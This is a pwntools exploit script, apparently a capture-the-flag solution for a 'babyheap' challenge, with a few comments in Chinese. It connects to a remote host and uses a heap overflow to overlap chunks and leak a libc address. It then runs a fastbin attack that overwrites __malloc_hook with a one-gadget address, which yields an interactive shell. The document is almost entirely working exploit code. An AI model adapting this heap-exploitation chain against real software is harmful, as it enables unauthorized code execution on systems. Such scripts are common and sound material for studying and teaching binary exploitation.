# coding=utf8
from pwn import *
conn=remote("10.131.1.19", 60013)
# conn=process("./babyheap_")
libc=ELF("./bc.so.6")
context.log_level="debug"
def malloc(size):
	conn.sendlineafter("Command: ","1")
	conn.sendlineafter("Size: ",str(size))
	conn.recvline()

def fill(index,content):
	conn.sendlineafter("Command: ","2")
	conn.sendlineafter("Index: ",str(index))
	conn.sendlineafter("Size: ",str(len(content)))
	conn.sendlineafter("Content: ",content)

def free(index):
	conn.sendlineafter("Command: ","3")
	conn.sendlineafter("Index: ",str(index))

def show(index):
	conn.sendlineafter("Command: ","4")
	conn.sendlineafter("Index: ",str(index))
	conn.recvline()
	return conn.recvline()

malloc(8)#0
malloc(200)#1
malloc(200)#2
malloc(8)#3

payload="a"*24+p64(0x1a1)
fill(0,payload)
free(1)#1
malloc(200)#1
distance=0x3c4b78
base=u64(show(2)[:8])-distance
print "libc add:",hex(base)
gadget=0x4526a
malloc_hook_add=libc.symbols["__malloc_hook"]+base
# 将剩余空间用掉 否则后面分配的内存块不连续
malloc(200)#4
# 开始将__malloc_hook 写入fastbin
malloc(0x70-8)#5
malloc(0x70-8)#6
malloc(8)#7
free(6)#6
pause()
payload="b"*0x68+p64(0x71)+p64(malloc_hook_add-19)
fill(5,payload)

malloc(0x70-8)#6
malloc(0x70-8)#8
fill(8,"zzz"+p64(gadget+base))

conn.sendlineafter("Command: ","1")
conn.sendlineafter("Size: ",str(8))
conn.interactive()
